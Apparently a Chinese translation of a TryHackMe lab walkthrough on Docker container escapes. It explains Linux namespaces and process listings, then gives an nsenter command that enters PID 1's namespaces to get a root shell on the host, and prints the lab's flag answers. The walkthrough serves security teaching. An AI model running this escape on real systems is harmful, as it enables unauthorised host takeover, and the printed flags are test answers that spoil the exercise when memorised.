<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Docker 引擎默认使用哪个端口号？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">2375</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-6-漏洞-4滥用命名空间">任务 6 漏洞 4：滥用命名空间<a href="#任务-6-漏洞-4滥用命名空间" class="hash-link" aria-label="任务 6 漏洞 4：滥用命名空间的直接链接" title="任务 6 漏洞 4：滥用命名空间的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="什么是命名空间">什么是命名空间<a href="#什么是命名空间" class="hash-link" aria-label="什么是命名空间的直接链接" title="什么是命名空间的直接链接" translate="no">​</a></h3>
<p>命名空间将系统资源（如进程、文件和内存）与其他命名空间隔离开来。 在 Linux 上运行的每个进程都将被分配两样东西：</p>
<ul>
<li class="">一个命名空间</li>
<li class="">一个进程标识符 (PID)</li>
</ul>
<p>命名空间是实现容器化的方式！ 进程只能&quot;看到&quot;同一命名空间中的进程。 以 Docker 为例，每个新容器都将作为一个新的命名空间运行，尽管容器可能运行多个应用程序（进程）。
让我们通过比较主机操作系统上的进程数量与主机正在运行的 Docker 容器（一个 apache2 Web 服务器）来证明容器化的概念：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing running processes on a </div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@thm-dev:~$ </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain">         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token parameter variable" style="color:#36acaa">--cut</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">1984</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.7</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">493400</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28932</span><span class="token plain"> ?        Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 update-notifier</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">2263</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">5.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3385096</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">396960</span><span class="token plain"> ?      Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:08 /snap/firefox/1232/usr/lib/firefox/firefox</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">2429</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2.8</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2447088</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">114900</span><span class="token plain"> ?      Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">2457</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1385228</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18496</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/snap userd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3054</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2.3</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2425836</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">91936</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">520</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3346</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.7</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">4.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2526924</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">162944</span><span class="token plain"> ?      Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:02 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">584</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3350</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2390708</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66560</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">584</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3369</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2390712</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66672</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">584</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3417</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2390708</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66432</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">590</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3490</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.3</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">428192</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12288</span><span class="token plain"> ?        Sl   00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/libexec/deja-dup/deja-dup-monitor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3524</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.8</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">932320</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">74496</span><span class="token plain"> ?        Sl   00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/nautilus --gapplication-service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3545</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.7</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.3</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">557340</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">55232</span><span class="token plain"> ?        Ssl  00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/libexec/gnome-terminal-server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3563</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">12908</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">6784</span><span class="token plain"> pts/0    Ss+  00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token function" style="color:#d73a49">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token parameter variable" style="color:#36acaa">--cut</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity--</span><br></span></code></pre></div></div>
<p>在最左边的第一列中，我们可以看到进程运行的用户，包括进程号 (PID)。 此外，请注意最右边的列包含启动进程的命令或应用程序（例如 Firefox 和 Gnome 终端）。 这里需要注意的是，有多个应用程序和进程正在运行（具体来说是 320 个！）。</p>
<p>一般来说，Docker 容器运行的进程非常少。 这是因为容器被设计为执行一项任务。 也就是说，只运行一个 Web 服务器或一个数据库。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="确定我们是否在容器中进程">确定我们是否在容器中（进程）<a href="#确定我们是否在容器中进程" class="hash-link" aria-label="确定我们是否在容器中（进程）的直接链接" title="确定我们是否在容器中（进程）的直接链接" translate="no">​</a></h3>
<p>让我们使用 <code>ps aux</code> 列出 Docker 容器中运行的进程。 需要注意的是，在这个例子中我们只有六个进程在运行。 进程数量的差异通常是一个很好的指标，表明我们在容器中。</p>
<p>此外，下面代码片段中的第一个进程的 PID 为 1。 这是正在运行的第一个进程。 PID 1（通常是 init）是所有未来启动进程的祖先（父进程）。 如果由于某种原因这个进程停止，那么所有其他进程也会停止。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing running processes on a container</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@demo-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># ps aux</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain">         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.2</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.2</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">166612</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11356</span><span class="token plain"> ?        Ss   00:47   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /sbin/init </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root          </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6520</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5212</span><span class="token plain"> ?  S 00:47 </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/apache2 </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> FOREGROUND </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data      </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1211168</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4112</span><span class="token plain"> ?  S 00:47 </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/apache2 </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> FOREGROUND </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data      </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1211168</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4116</span><span class="token plain"> ?  S 00:47 </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/apache2 </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> FOREGROUND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root          </span><span class="token number" style="color:#36acaa">81</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5888</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2972</span><span class="token plain"> pts/0  R+ 00:52 </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux</span><br></span></code></pre></div></div>
<p>相比之下，我们可以看到只有 5 个进程在运行。 一个很好的指标，表明我们在容器中！ 然而，我们很快就会发现，这并非 100% 确定。 在某些情况下，讽刺的是，您希望容器能够直接与主机交互。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="我们如何滥用命名空间">我们如何滥用命名空间<a href="#我们如何滥用命名空间" class="hash-link" aria-label="我们如何滥用命名空间的直接链接" title="我们如何滥用命名空间的直接链接" translate="no">​</a></h3>
<p>回顾之前漏洞中的 cgroups（控制组）。 我们将在另一种利用方法中使用这些。 这种攻击滥用了容器与主机操作系统共享相同命名空间的情况（因此，容器可以与主机上的进程通信）。</p>
<p>您可能会在容器依赖正在运行的进程或需要&quot;插入&quot;主机的情况下看到这种情况，例如使用调试工具时。 在这些情况下，当通过 <code>ps aux</code> 列出进程时，您可以在容器中看到主机的进程。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Edge case: Determining if a container can interact with the host&#x27;s processes</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@demo-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># ps aux</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain">         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.5</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102796</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11372</span><span class="token plain"> ?        Ss   </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:40   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:03 /sbin/init</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">      </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> ?        S    </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:40   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kthreadd</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">      </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> ?        I</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:40   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rcu_gp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-- </span><span class="token function" style="color:#d73a49">cut</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity --</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2119</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1148348</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3372</span><span class="token plain"> ?        Sl   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/docker-proxy </span><span class="token parameter variable" style="color:#36acaa">-proto</span><span class="token plain"> tcp -host-ip </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0 -host-port </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> -container-ip </span><span class="token number" style="color:#36acaa">172.17</span><span class="token plain">.0.2 </span><span class="token parameter variable" style="color:#36acaa">-container</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2125</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1148348</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3392</span><span class="token plain"> ?        Sl   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/docker-proxy </span><span class="token parameter variable" style="color:#36acaa">-proto</span><span class="token plain"> tcp -host-ip :: -host-port </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> -container-ip </span><span class="token number" style="color:#36acaa">172.17</span><span class="token plain">.0.2 -container-port</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2141</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">712144</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">9192</span><span class="token plain"> ?        Sl   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/containerd-shim-runc-v2 </span><span class="token parameter variable" style="color:#36acaa">-namespace</span><span class="token plain"> moby </span><span class="token parameter variable" style="color:#36acaa">-id</span><span class="token plain"> 2032326e64254786be0a420199ef845d8f97afccba9e2e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2163</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.2</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">72308</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">5644</span><span class="token plain"> ?        Ss   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/sshd </span><span class="token parameter variable" style="color:#36acaa">-D</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="漏洞-1">漏洞<a href="#漏洞-1" class="hash-link" aria-label="漏洞的直接链接" title="漏洞的直接链接" translate="no">​</a></h3>
<p>对于此漏洞，我们将使用 nsenter（命名空间进入）。 此命令允许我们执行或启动进程，并将它们放置在另一个进程的同一命名空间中。 在这种情况下，我们将滥用容器可以看到主机上的 &quot;/sbin/init&quot; 进程这一事实，这意味着我们可以在主机上启动新命令，例如 bash shell。</p>
<hr>
<p>使用以下利用：<code>nsenter --target 1 --mount --uts --ipc --net /bin/bash</code>，其作用如下：</p>
<ol>
<li class="">
<p>我们使用值为 &quot;1&quot; 的 <code>--target</code> 开关来执行我们稍后提供的 shell 命令，在特殊系统进程 ID 的命名空间中执行以获得终极 root 权限！</p>
</li>
<li class="">
<p>指定 <code>--mount</code>，这是我们提供目标进程的挂载命名空间的地方。 &quot;如果未指定文件，则进入目标进程的挂载命名空间。&quot; (<a href="https://man7.org/linux/man-pages/man1/nsenter.1.html" target="_blank" rel="noopener noreferrer" class="">Man.org., 2013</a>)。</p>
</li>
<li class="">
<p><code>--uts</code> 开关允许我们与目标进程共享相同的 UTS 命名空间，意味着使用相同的主机名。 这很重要，因为主机名不匹配可能导致连接问题（尤其是网络服务）。</p>
</li>
<li class="">
<p><code>--ipc</code> 开关意味着我们进入进程的进程间通信命名空间，这很重要。 这意味着可以共享内存。</p>
</li>
<li class="">
<p><code>--net</code> 开关意味着我们进入网络命名空间，意味着我们可以与系统的网络相关功能交互。 例如，网络接口。 我们可以使用这个来打开一个新的连接（例如在主机上的稳定反向 shell）。</p>
</li>
<li class="">
<p>由于我们目标是 &quot;<strong>/sbin/init</strong>&quot; 进程 #1（尽管它是 &quot;<strong>lib/systemd/systemd</strong>&quot; 的符号链接以保持向后兼容性），我们正在使用 <a href="https://www.freedesktop.org/wiki/Software/systemd/" target="_blank" rel="noopener noreferrer" class="">systemd</a> 守护进程的命名空间和权限来运行我们的新进程（shell）</p>
</li>
<li class="">
<p>这是我们的进程将被执行到这个特权命名空间的地方：<code>sh</code> 或一个 shell。 这将在内核的同一命名空间（因此也是权限）中执行。</p>
</li>
</ol>
<p>您可能需要按 &quot;<strong>Ctrl + C</strong>&quot; 一次或两次来取消此漏洞的利用，但如下所示，我们已经逃逸了 docker 容器，并且可以查看主机操作系统（显示主机名的变化）</p>
<hr>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Using the command line of the container to run commands on the host</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@demo-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># hostname</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thm-docker-host</span><br></span></code></pre></div></div>
<p>成功！ 我们现在将能够在命名空间中作为 root 查看主机操作系统，这意味着我们拥有对主机上任何内容的完全访问权限！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 在目标机器上执行此任务中的利用。 <strong>位于 /home/tryhackme/flag.txt 的标志是什么？</strong> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{YOUR-SPACE-MY-SPACE}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-7-结论">任务 7 结论<a href="#任务-7-结论" class="hash-link" aria-label="任务 7 结论的直接链接" title="任务 7 结论的直接链接" translate="no">​</a></h2>
<p>呼...这很有趣！ 在今天的房间中，您了解了 Docker 容器可能存在的一些错误配置，如何发现这些配置，并最终利用它们。</p>
<p>现在，您可能想知道为什么容器可能以有效绕过 Docker 引入的安全机制的权限运行。 嗯，虽然这不是推荐的做法，但在某些用例中容器确实需要这种级别的交互。 例如，在 Docker 中运行 Docker，或者需要与主机的 iptables 或可能连接的设备交互的特定应用程序，如防火墙。</p>
<p>最终，在尝试确定分配给容器的权限时，也存在“采取快速/简单途径”的因素。 Docker（尤其是在最近）在加固方面做得很好。 例如，您可以在允许列表的基础上为容器授予特定能力。  然而，人们为了在不意识到更广泛后果的情况下使某些东西工作而给予超过必要的能力，这并非太牵强。</p>
<p>我们将在下一个<strong>房间</strong>“容器加固”中讨论如何防止这些错误配置和漏洞。</p>
